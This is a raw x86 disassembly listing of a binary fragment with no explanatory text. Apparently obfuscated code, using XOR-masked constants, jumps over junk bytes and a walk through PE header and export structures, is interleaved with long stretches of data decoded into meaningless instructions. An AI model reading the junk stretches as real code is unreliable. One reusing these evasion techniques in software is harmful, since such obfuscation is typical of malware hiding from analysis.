  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	dec    ecx
  408bf1:	mov    eax,0xd266800c
  408bf6:	jle    0x408c76
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	pop    edx
  408bfd:	nop
  408bfe:	sbb    bh,BYTE PTR [esi]
  408c00:	inc    esp
  408c01:	mov    eax,0xe813a1fd
  408c06:	sub    ebp,ebp
  408c08:	inc    esp
  408c09:	cmp    BYTE PTR [edx-0x7ca38c37],dh
  408c0f:	lea    ebx,[edi+ebx*4+0x5f]
  408c13:	int3   
  408c14:	mov    dh,0xa9
  408c16:	adc    esp,DWORD PTR [ebp+0x543cee4b]
  408c1c:	inc    esp
  408c1d:	push   ebx
  408c1e:	stc    
  408c1f:	push   ebx
  408c20:	mov    WORD PTR [ecx],?
  408c22:	int3   
  408c23:	cld    
  408c24:	or     al,0x68
  408c26:	jno    0x408c71
  408c28:	pop    edx
  408c29:	add    BYTE PTR [ecx],dh
  408c2b:	pusha  
  408c2c:	test   eax,0x1440faad
  408c31:	jno    0x408c5a
  408c33:	mov    al,ds:0x3b4a84c1
  408c38:	pop    edi
  408c39:	or     eax,0x6939aac3
  408c3e:	sbb    al,0xb0
  408c40:	push   cs
  408c41:	lds    esp,FWORD PTR [eax+ecx*1+0x70]
  408c45:	inc    edx
  408c46:	cmp    DWORD PTR [edi+0x6e],eax
  408c49:	pop    edx
  408c4a:	pop    esi
  408c4b:	scas   al,BYTE PTR es:[edi]
  408c4c:	add    BYTE PTR [esi-0x5046e636],ah
  408c52:	inc    ebx
  408c53:	mov    ah,BYTE PTR ds:0x1aca161d
  408c59:	into   
  408c5a:	dec    esi
  408c5b:	or     bh,BYTE PTR ds:0x96425e7
  408c61:	shl    DWORD PTR [ebx],cl
  408c63:	int3   
  408c64:	jge    0x408cae
  408c66:	shr    BYTE PTR [edx+0x4b],1
  408c69:	xchg   esi,eax
  408c6a:	int    0xa5
  408c6c:	xchg   esp,eax
  408c6d:	inc    edx
  408c6e:	jne    0x408ca5
  408c70:	adc    eax,0x781967a6
  408c75:	adc    BYTE PTR [edi-0x51],cl
  408c78:	jle    0x408c1f
  408c7a:	xchg   esp,eax
  408c7b:	sub    al,0xff
  408c7d:	cmp    bh,ah
  408c7f:	adc    dh,BYTE PTR [eax+esi*4]
  408c82:	aas    
  408c83:	enter  0x9cc7,0x99
  408c87:	inc    ecx
  408c88:	repz dec edx
  408c8a:	lds    edi,FWORD PTR [ebp+0x62]
  408c8d:	and    bh,BYTE PTR [edx+0x63]
  408c90:	or     eax,0xfe396a86
  408c95:	adc    dh,BYTE PTR [ecx-0x43304702]
  408c9b:	pop    ebp
  408c9d:	cs jmp 0x531ad663
  408ca3:	jmp    0xaf42:0xc945fe60
  408caa:	xchg   esi,eax
  408cab:	lods   eax,DWORD PTR ds:[esi]
  408cac:	das    
  408cad:	mov    eax,0xc57cc83
  408cb2:	jmp    0x8972:0xfd29ff80
  408cb9:	fbld   TBYTE PTR [edx+0x21176083]
  408cbf:	adc    al,0x18
  408cc1:	mov    ebp,0xa17f4ff7
  408cc6:	stos   BYTE PTR es:[edi],al
  408cc7:	int3   
  408cc8:	lock pop ss
  408cca:	sub    ch,0x89
  408ccd:	jne    0x408cab
  408ccf:	das    
  408cd0:	out    dx,eax
  408cd1:	scas   eax,DWORD PTR es:[edi]
  408cd2:	push   es
  408cd3:	xchg   ecx,eax
  408cd4:	(bad)  
  408cd5:	push   ebx
  408cd6:	(bad)  
  408cd7:	mov    dh,BYTE PTR [edi]
  408cd9:	xchg   DWORD PTR [eax+0x3a2db9e],ebx
  408cdf:	mov    dh,al
  408ce1:	(bad)  
  408ce2:	sub    edx,DWORD PTR [edx-0x3237aa9f]
  408ce8:	test   eax,0x562ab77c
  408ced:	dec    esp
  408cee:	movntq (bad),mm4
  408cef:	out    0xe3,eax
  408cf1:	(bad)  
  408cf2:	shl    BYTE PTR ds:0xc1431ecf,1
  408cf8:	mov    bl,0x8f
  408cfa:	pop    ecx
  408cfb:	xchg   ecx,eax
  408cfc:	sub    esi,DWORD PTR [edx]
  408cfe:	leave  
  408cff:	sbb    BYTE PTR [ecx+0x7dfa1c88],bl
  408d05:	xor    BYTE PTR [edi+0x5e],bl
  408d08:	jg     0x408d78
  408d0a:	jl     0x408d2c
  408d0c:	fild   DWORD PTR [ebp+0x404f3f2c]
  408d12:	into   
  408d13:	imul   BYTE PTR [eax-0x1d]
  408d16:	mov    edi,0x69d74a63
  408d1b:	popa   
  408d1c:	nop
  408d1d:	lods   eax,DWORD PTR ds:[esi]
  408d1e:	ins    BYTE PTR es:[edi],dx
  408d1f:	dec    ebp
  408d20:	int3   
  408d21:	imul   edi,DWORD PTR [esi-0x5e5c00b0],0xffffffa0
  408d28:	cmp    DWORD PTR [eax+0x46f4a4d0],esi
  408d2e:	out    dx,eax
  408d2f:	sti    
  408d30:	pop    ecx
  408d31:	cmp    al,al
  408d33:	dec    ebx
  408d34:	xor    esi,esi
  408d36:	fld    TBYTE PTR [edx+0x50]
  408d39:	jg     0x408d30
  408d3b:	lea    esi,ds:[ebp-0x3768134a]
  408d42:	and    ecx,DWORD PTR ds:0xaa36e602
  408d48:	arpl   WORD PTR [ecx],bx
  408d4a:	push   es
  408d4b:	ins    BYTE PTR es:[edi],dx
  408d4c:	cmp    eax,0xf36bae0
  408d51:	jg     0x408cff
  408d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d54:	(bad)  
  408d55:	pop    esp
  408d56:	add    DWORD PTR [ebp-0x7fdf5606],esi
  408d5c:	push   esi
  408d5d:	push   ds
  408d5e:	out    0x1c,eax
  408d60:	pop    eax
  408d61:	loope  0x408ddd
  408d63:	push   ebx
  408d64:	aaa    
  408d65:	xchg   ebp,eax
  408d66:	and    al,0xff
  408d68:	fsubrp st(7),st
  408d6a:	test   al,0x76
  408d6c:	cmp    al,0x3d
  408d6e:	mov    al,BYTE PTR [edi]
  408d70:	add    ch,ch
  408d72:	das    
  408d73:	ret    
  408d74:	in     al,dx
  408d75:	jmp    0x408d2d
  408d77:	dec    esp
  408d78:	fwait
  408d79:	push   ds
  408d7a:	dec    esp
  408d7b:	test   al,0xe2
  408d7d:	xchg   ebx,eax
  408d7e:	jl     0x408da1
  408d80:	ret    
  408d81:	fdivr  DWORD PTR [ebp+0x6a]
  408d84:	inc    ebp
  408d85:	(bad)  
  408d87:	inc    ebp
  408d88:	xor    eax,0x5b71e20b
  408d8d:	jae    0x408d1b
  408d8f:	dec    ecx
  408d90:	inc    edi
  408d91:	(bad)  [edx]
  408d93:	mov    esp,0x4ca1814b
  408d98:	mov    ah,0xbd
  408d9a:	jmp    0x408d86
  408d9c:	dec    esi
  408d9d:	push   edx
  408d9e:	nop
  408d9f:	cwde   
  408da0:	shl    dl,0xaa
  408da3:	ret    0x7e41
  408da6:	dec    esi
  408da7:	push   fs
  408da9:	inc    eax
  408daa:	add    eax,DWORD PTR [ebp+esi*1-0x2f2288b0]
  408db1:	xchg   edi,eax
  408db2:	sub    BYTE PTR [edi],bh
  408db4:	adc    al,0xb0
  408db6:	pop    eax
  408db7:	ficom  WORD PTR [ecx+0x11]
  408dba:	mov    ah,0xee
  408dbc:	iret   
  408dbd:	into   
  408dbe:	pop    ecx
  408dbf:	retf   
  408dc0:	into   
  408dc1:	xchg   edi,eax
  408dc2:	ss into 
  408dc4:	xor    al,0x3e
  408dc6:	pusha  
  408dc7:	(bad)  
  408dc8:	call   0x52570561
  408dcd:	scas   al,BYTE PTR es:[edi]
  408dce:	xlat   BYTE PTR ds:[ebx]
  408dcf:	dec    edx
  408dd0:	cmp    edi,DWORD PTR [ebp-0x60]
  408dd3:	xor    ecx,DWORD PTR [esi+0x6c]
  408dd6:	jle    0x408e10
  408dd8:	mov    ds:0x66e509d1,eax
  408ddd:	in     al,dx
  408dde:	jo     0x408d8e
  408de0:	ins    BYTE PTR es:[edi],dx
  408de1:	xor    al,0x8d
  408de3:	xchg   edx,eax
  408de4:	jge    0x408dc7
  408de6:	xor    BYTE PTR [esi-0x32d0f86c],ah
  408dec:	ffree  st(7)
  408dee:	xor    DWORD PTR [edx+0x6eb509c9],ebp
  408df4:	dec    ebx
  408df5:	mov    ah,0x6d
  408df7:	dec    ebx
  408df8:	std    
  408df9:	nop
  408dfa:	xor    edx,DWORD PTR [ecx+ebx*2+0x46bbd000]
  408e01:	and    ah,bl
  408e03:	call   DWORD PTR [ecx+0x67]
  408e06:	fld    DWORD PTR [eax]
  408e08:	es adc eax,0x7d4a75b6
  408e0e:	dec    esp
  408e0f:	repnz loope 0x408e04
  408e12:	sbb    al,0x53
  408e14:	loope  0x408e52
  408e16:	dec    esi
  408e17:	push   ds
  408e18:	fwait
  408e19:	or     edx,edi
  408e1b:	push   edi
  408e1c:	sbb    edi,DWORD PTR [ebp+edi*1+0x16]
  408e20:	ror    DWORD PTR es:[esi],1
  408e23:	mov    cl,0x5
  408e25:	mov    edi,0xfc458b66
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x27ea2203
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	cmp    cl,dl
  408ec6:	cmp    al,0xcf
  408ec8:	into   
  408ec9:	into   
  408eca:	xchg   esp,eax
  408ecb:	pop    ebx
  408ecc:	test   al,0xd9
  408ece:	pop    esi
  408ecf:	test   DWORD PTR [ebx-0x6e6280a],0xf18f066b
  408ed9:	jb     0x408e70
  408edb:	fnstsw WORD PTR [edi]
  408edd:	mov    ds:0x2aff4e9f,eax
  408ee2:	xchg   ebx,eax
  408ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ee4:	icebp  
  408ee5:	pop    ds
  408ee6:	rcl    al,1
  408ee8:	sar    BYTE PTR [ecx],1
  408eea:	jmp    DWORD PTR [ebx-0x7ac87ee1]
  408ef0:	push   0xffffffbd
  408ef2:	cmp    DWORD PTR [ebp-0x6051bd93],edx
  408ef8:	xor    esi,DWORD PTR [esi-0x6a]
  408efb:	das    
  408efc:	sbb    BYTE PTR [esi+0x1657e7d],0xd4
  408f03:	or     edx,edx
  408f05:	lahf   
  408f06:	dec    esp
  408f07:	inc    ebp
  408f08:	fnstcw WORD PTR [eax-0x31c977fc]
  408f0e:	popa   
  408f0f:	xchg   esi,eax
  408f10:	call   FWORD PTR [ebx]
  408f12:	cld    
  408f13:	sub    DWORD PTR [ebp+0x289ae4],esi
  408f19:	test   BYTE PTR [ebx-0x7],0x37
  408f1d:	mov    ecx,0x3b654847
  408f22:	(bad)
  408f25:	xor    BYTE PTR [edx+ecx*8+0x3e],ah
  408f29:	and    DWORD PTR [edi+0x53d0f4c1],ecx
  408f2f:	sub    BYTE PTR [ebp*1-0x124f0032],cl
  408f36:	rcr    BYTE PTR [edi],1
  408f38:	sar    BYTE PTR cs:[ecx-0x73],cl
  408f3c:	or     BYTE PTR [ecx],cl
  408f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f3f:	mov    eax,0x1dec4b21
  408f44:	push   0xffffffa1
  408f46:	push   esp
  408f47:	dec    edx
  408f48:	mov    al,ds:0xbb7d2705
  408f4d:	push   0x21c23366
  408f52:	lock (bad) 
  408f54:	loope  0x408fad
  408f56:	sahf   
  408f57:	jmp    FWORD PTR [esi+0x3dc041a5]
  408f5d:	rcl    DWORD PTR gs:[ebx],1
  408f60:	loop   0x408f81
  408f62:	pop    esp
  408f63:	jmp    0xd7c3:0x608f85aa
  408f6a:	sahf   
  408f6b:	scas   eax,DWORD PTR es:[edi]
  408f6c:	mov    bl,0xf
  408f6e:	lea    ebp,[ebx+0x33]
  408f71:	adc    eax,0x9eb84580
  408f76:	cdq    
  408f77:	or     BYTE PTR [eax+0x7],dl
  408f7a:	dec    ebx
  408f7b:	cmp    eax,ecx
  408f7d:	sbb    BYTE PTR [ecx-0x6ca1157c],dl
  408f83:	sub    eax,0x64a5ea5f
  408f88:	ja     0x408f42
  408f8a:	push   ecx
  408f8b:	sbb    ch,al
  408f8d:	popa   
  408f8e:	jle    0x408fb0
  408f90:	inc    ebx
  408f91:	and    BYTE PTR [ecx+0x5a84ff68],dh
  408f97:	and    esi,DWORD PTR [esi+0x21bc311d]
  408f9d:	pop    esp
  408f9e:	test   ch,dl
  408fa0:	lock aad 0xd
  408fa3:	int3   
  408fa4:	fistp  DWORD PTR [ebx+0x6c813ed8]
  408faa:	mov    ebp,0x63ffe700
  408faf:	inc    esp
  408fb0:	ins    DWORD PTR es:[edi],dx
  408fb1:	push   ds
  408fb2:	or     esi,DWORD PTR [ebp-0x5e9a005]
  408fb8:	out    dx,al
  408fb9:	sub    cl,BYTE PTR [ecx+0x6f]
  408fbc:	push   es
  408fbd:	aaa    
  408fbe:	out    0xd2,eax
  408fc0:	aaa    
  408fc1:	xchg   edi,eax
  408fc2:	das    
  408fc3:	sub    DWORD PTR [ebx+0x31],esi
  408fc6:	or     eax,0x4412ed53
  408fcb:	mov    ch,0xaa
  408fcd:	inc    edi
  408fce:	and    BYTE PTR [edi+0x3f22377f],dl
  408fd4:	and    DWORD PTR [ebx-0xd0e6240],0x7e4f31d0
  408fde:	mov    eax,ds:0x1c866fce
  408fe3:	ins    BYTE PTR es:[edi],dx
  408fe4:	xchg   edx,edx
  408fe6:	mov    al,ds:0x608e3718
  408feb:	sub    edi,DWORD PTR [edi]
  408fed:	cwde   
  408fee:	push   0x22174303
  408ff3:	mov    ds:0x62705b97,eax
  408ff8:	out    0x4,eax
  408ffa:	sbb    dl,BYTE PTR [edx-0x2c10ecdf]
  409000:	or     DWORD PTR [esi+0xc],0x18
  409004:	pop    es
  409005:	and    al,0x3f
  409007:	xchg   ebx,eax
  409008:	das    
  409009:	in     eax,0x86
  40900b:	inc    ebx
  40900c:	push   0xffffffe4
  40900e:	cmp    eax,0x5727dcde
  409013:	js     0x408fd5
  409015:	sub    al,0x56
  409017:	jmp    0x10982fc7
  40901c:	sbb    BYTE PTR [esi],bl
  40901e:	adc    eax,DWORD PTR [edi-0x5]
  409021:	aam    0xe0
  409023:	std    
  409024:	in     al,0x91
  409026:	lock test dl,cl
  409029:	fsub   st(0),st
  40902b:	jmp    0xc64c:0x842fd626
  409032:	lock dec ebp
  409034:	mov    eax,0x75c73678
  409039:	sahf   
  40903a:	pop    esi
  40903b:	ja     0x408fc3
  40903d:	cwde   
  40903e:	sub    eax,0x31b017a9
  409043:	mov    ch,BYTE PTR ds:0x29771b87
  409049:	ja     0x409046
  40904b:	scas   al,BYTE PTR es:[edi]
  40904c:	cld    
  40904d:	sbb    DWORD PTR [eax+0xd91b632],ebp
  409053:	jns    0x40900f
  409055:	xor    BYTE PTR [eax],cl
  409057:	xlat   BYTE PTR ds:[ebx]
  409058:	push   ebx
  409059:	jmp    0x409016
  40905b:	sub    DWORD PTR [edx],esi
  40905d:	sar    DWORD PTR [ebx-0x733cf583],cl
  409063:	pop    esp
  409064:	jmp    0x4090c7
  409066:	xchg   edi,eax
  409067:	rol    BYTE PTR [ebx+eiz*1-0x71],1
  40906b:	test   al,0x25
  40906d:	fcomp  QWORD PTR [edx+0x367f93a8]
  409073:	popa   
  409074:	(bad)  
  409075:	sbb    eax,0xe34e40a9
  40907a:	add    al,0x3f
  40907c:	fild   QWORD PTR [esi-0x1b]
  40907f:	xchg   bl,dh
  409081:	jp     0x4090b3
  409083:	xor    dh,0x46
  409086:	jb     0x409069
  409088:	add    al,0x83
  40908a:	jo     0x4090d9
  40908c:	bound  eax,QWORD PTR [ebp-0x1d410889]
  409092:	lock fisubr DWORD PTR [ecx]
  409095:	mov    ch,0xed
  409097:	adc    al,0x22
  409099:	mov    al,BYTE PTR [edx-0x50]
  40909c:	gs pop es
  40909e:	pop    ss
  40909f:	dec    ecx
  4090a0:	jne    0x409056
  4090a2:	mov    edi,0x9627d825
  4090a7:	imul   ecx,DWORD PTR [edi-0x31],0xffffff8d
  4090ab:	in     eax,0x9
  4090ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ae:	int    0xc9
  4090b0:	daa    
  4090b1:	outs   dx,DWORD PTR ds:[esi]
  4090b2:	mov    eax,ds:0x57de6b1
  4090b7:	idiv   DWORD PTR [ebx]
  4090b9:	es xchg edx,eax
  4090bb:	call   0x463a7d30
  4090c0:	mov    eax,ds:0x2757e2d
  4090c5:	adc    al,bh
  4090c7:	ror    DWORD PTR [ecx-0x335ffa8c],0x67
  4090ce:	xchg   edx,eax
  4090cf:	(bad)  
  4090d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090d1:	dec    eax
  4090d2:	mov    cl,0xcc
  4090d4:	inc    ebp
  4090d5:	jnp    0x4090fe
  4090d7:	push   ss
  4090d8:	jns    0x4090b1
  4090da:	adc    eax,0xa8eb935
  4090df:	fisttp DWORD PTR [edi-0x7214606c]
  4090e5:	cmp    BYTE PTR ds:0x3b925cb,ah
  4090eb:	mov    dh,0x48
  4090ed:	jecxz  0x409122
  4090ef:	mov    BYTE PTR [ebx],0xc7
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x90
  409163:	arpl   si,dx
  409165:	ss xor bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	xor    ecx,DWORD PTR [esi+ecx*4+0x2c3259c1]
  409175:	dec    ecx
  409176:	inc    ebx
  409177:	mov    ?,WORD PTR [edx+0x1ceada3]
  40917d:	xchg   ebp,eax
  40917e:	int3   
  40917f:	(bad)  
  409180:	nop
  409181:	cmp    ebp,DWORD PTR [ebp+0x1d7bd527]
  409187:	(bad)
  40918b:	jno    0x4091f4
  40918d:	xchg   edx,eax
  40918e:	jg     0x409152
  409190:	fwait
  409191:	add    eax,0xd0195c23
  409196:	xlat   BYTE PTR ds:[ebx]
  409197:	mov    gs,edi
  409199:	sbb    BYTE PTR [eax+0x42],0x99
  40919d:	iret   
  40919e:	stos   BYTE PTR es:[edi],al
  40919f:	cmp    al,0xc2
  4091a1:	jle    0x40920a
  4091a3:	xor    edi,DWORD PTR [ecx+0x6df44f4f]
  4091a9:	xchg   ebx,eax
  4091aa:	(bad)  
  4091ab:	pop    esp
  4091ac:	add    eax,0xc312ad62
  4091b1:	pop    ss
  4091b2:	mov    dh,0x56
  4091b4:	or     eax,0x9441eecf
  4091b9:	bound  edi,QWORD PTR [ebx-0x2f]
  4091bc:	cwde   
  4091bd:	jo     0x4091b0
  4091bf:	inc    ebp
  4091c0:	mov    esi,0xb4a0693
  4091c5:	cmc    
  4091c6:	push   esi
  4091c7:	ds mov bl,0x3c
  4091ca:	bound  edi,QWORD PTR [ebx+0x4d73ef4b]
  4091d0:	jg     0x409220
  4091d2:	ret    
  4091d3:	jo     0x4091fc
  4091d5:	nop
  4091d6:	retf   
  4091d7:	stc    
  4091d8:	add    BYTE PTR [edi],bh
  4091da:	stc    
  4091db:	add    ch,al
  4091dd:	adc    bl,BYTE PTR [ecx+eiz*2]
  4091e0:	fiadd  DWORD PTR [eax+0x77d860c]
  4091e6:	imul   esp,DWORD PTR [edx],0x75959880
  4091ec:	jmp    0x40922c
  4091ee:	clc    
  4091ef:	loop   0x4091bc
  4091f1:	mov    cl,0xf7
  4091f3:	push   edx
  4091f4:	inc    esp
  4091f5:	push   ebx
  4091f6:	jmp    0x41fd3360
  4091fb:	and    al,BYTE PTR [ecx-0x70]
  4091fe:	adc    edi,ecx
  409200:	push   ss
  409201:	xor    al,0xec
  409203:	(bad)  
  409205:	pop    ss
  409206:	mov    al,0x1b
  409208:	push   ss
  409209:	loop   0x40925e
  40920b:	sbb    al,0x3e
  40920d:	nop
  40920e:	shr    DWORD PTR [edx],cl
  409210:	pop    ecx
  409211:	sahf   
  409212:	adc    BYTE PTR [ecx-0x32],cl
  409215:	or     eax,0x1b30e4fe
  40921a:	xchg   ebp,eax
  40921b:	jb     0x4091d3
  40921d:	jle    0x4091a7
  40921f:	int3   
  409220:	jmp    0x409232
  409222:	das    
  409223:	mov    dl,0xad
  409225:	nop
  409226:	mov    ds:0x216da021,al
  40922b:	xor    bh,BYTE PTR [eax+0x66ab6491]
  409231:	xchg   ecx,eax
  409232:	push   0xe3e0e0b
  409237:	fstp   QWORD PTR [eax]
  409239:	(bad)  
  40923a:	loope  0x409282
  40923c:	das    
  40923d:	sbb    ah,BYTE PTR [ebp+0x1e]
  409240:	bound  esp,QWORD PTR [ecx-0xa]
  409243:	mov    ebx,0x26f35b87
  409248:	scas   al,BYTE PTR es:[edi]
  409249:	add    eax,0xb283acd5
  40924e:	fild   QWORD PTR [ecx+eiz*1+0x24d7840c]
  409255:	mov    ds:0x498ec2e8,eax
  40925a:	out    0x42,al
  40925c:	and    BYTE PTR [eax],ah
  40925e:	daa    
  40925f:	adc    al,0x46
  409261:	push   0x4a
  409263:	test   BYTE PTR [eax-0x17],dh
  409266:	cdq    
  409267:	xchg   ebp,eax
  409268:	sub    BYTE PTR [edx+0x7f],0xf0
  40926c:	(bad)  
  40926d:	cli    
  40926e:	and    bh,dh
  409270:	inc    ecx
  409271:	mov    ecx,DWORD PTR [eax]
  409273:	mov    cl,0x54
  409275:	pop    ds
  409276:	sbb    al,0x4a
  409278:	push   ss
  409279:	mov    edi,0xd4874a48
  40927e:	adc    al,0xaa
  409280:	xor    esp,DWORD PTR [eax-0x1398b28a]
  409286:	push   ecx
  409287:	test   eax,0x92f0b0ed
  40928c:	hlt    
  40928d:	out    dx,eax
  40928e:	xchg   esi,eax
  40928f:	pop    esp
  409290:	leave  
  409291:	mov    dl,0x83
  409293:	xchg   edx,eax
  409294:	push   ds
  409295:	dec    ebp
  409296:	pop    esp
  409297:	mov    ah,0xf5
  409299:	stc    
  40929a:	jp     0x4092b9
  40929c:	(bad)  
  40929d:	sub    al,0x6c
  40929f:	(bad)  
  4092a0:	std    
  4092a1:	jecxz  0x40931d
  4092a3:	lods   al,BYTE PTR ds:[esi]
  4092a4:	call   0x3414fd2f
  4092a9:	stos   BYTE PTR es:[edi],al
  4092aa:	das    
  4092ab:	out    0x47,eax
  4092ad:	(bad)  
  4092ae:	push   ss
  4092af:	cmp    ch,dl
  4092b1:	repz je 0x4092ae
  4092b4:	and    eax,0xfb37477a
  4092b9:	pop    ecx
  4092ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092bb:	add    DWORD PTR [esi+0x36],0x4ed178c5
  4092c2:	(bad)  
  4092c3:	xor    eax,0x62571e25
  4092c8:	cs pop edx
  4092ca:	jno    0x409326
  4092cc:	scas   eax,DWORD PTR es:[edi]
  4092cd:	mov    cl,0xe1
  4092cf:	(bad)  
  4092d0:	in     al,0xb5
  4092d2:	out    dx,al
  4092d3:	jp     0x4092cf
  4092d5:	iret   
  4092d6:	cmc    
  4092d7:	add    eax,DWORD PTR [edi+0x490c7d86]
  4092dd:	call   0x11bb1c4f
  4092e2:	xchg   edx,eax
  4092e3:	cmp    BYTE PTR [ebx],al
  4092e5:	xor    al,BYTE PTR [ecx-0x9]
  4092e8:	mov    ds:0xde1c1fc5,eax
  4092ed:	es js  0x4092c4
  4092f0:	cmp    al,0x1e
  4092f2:	mov    edi,0xfc6ac97f
  4092f7:	sub    al,0x4
  4092f9:	mov    ds:0x54747f61,eax
  4092fe:	jge    0x4092c5
  409300:	int3   
  409301:	mov    esp,DWORD PTR ds:0xecdb2eea
  409307:	push   ss
  409308:	je     0x40937e
  40930a:	(bad)  
  40930b:	push   edx
  40930c:	fsincos 
  40930e:	inc    eax
  40930f:	or     esp,DWORD PTR [edx]
  409311:	pop    edi
  409312:	stc    
  409313:	pop    esp
  409314:	adc    BYTE PTR [ecx-0x65019544],ah
  40931a:	jne    0x4092df
  40931c:	xchg   ebp,eax
  40931d:	mov    bh,0x41
  40931f:	retf   0xaf97
  409322:	cmp    ecx,ebp
  409324:	pop    es
  409325:	rol    DWORD PTR [ebx-0x36638eed],0x90
  40932c:	gs or  al,0xc2
  40932f:	push   ebp
  409330:	(bad)  
  409331:	out    0x39,al
  409333:	or     ebp,DWORD PTR [edx]
  409335:	xchg   BYTE PTR [eax+ecx*8],ch
  409338:	lds    ebx,FWORD PTR ds:0x93a9ba01
  40933e:	shr    DWORD PTR [edx+0x7f7461a1],cl
  409344:	pop    ecx
  409345:	daa    
  409346:	jnp    0x4093c5
  409348:	ror    al,0x71
  40934b:	adc    eax,0x5becdb19
  409350:	xchg   edx,eax
  409351:	cwde   
  409352:	cmp    eax,ebx
  409354:	(bad)  
  409355:	pop    ecx
  409356:	mov    eax,DWORD PTR [edx-0x602cef29]
  40935c:	ror    BYTE PTR [eax-0x53089011],1
  409362:	pop    edx
  409363:	inc    ecx
  409364:	push   eax
  409365:	adc    al,ah
  409367:	sbb    esi,ebx
  409369:	add    ebp,DWORD PTR [ecx+edi*1+0x3e]
  40936d:	jbe    0x4093a4
  40936f:	stos   BYTE PTR es:[edi],al
  409370:	add    BYTE PTR [edi+0x35455538],ah
  409376:	xor    DWORD PTR ds:0xefccdda3,ecx
  40937c:	popf   
  40937d:	xchg   esp,eax
  40937e:	push   cs
  40937f:	add    DWORD PTR [ebx+0x66],ebp
  409382:	xchg   ebp,eax
  409383:	mov    edi,0xc0f7d599
  409388:	outs   dx,DWORD PTR ds:[esi]
  409389:	pop    eax
  40938a:	ins    BYTE PTR es:[edi],dx
  40938b:	repz jbe 0x4093da
  40938e:	and    eax,0xc7892a5e
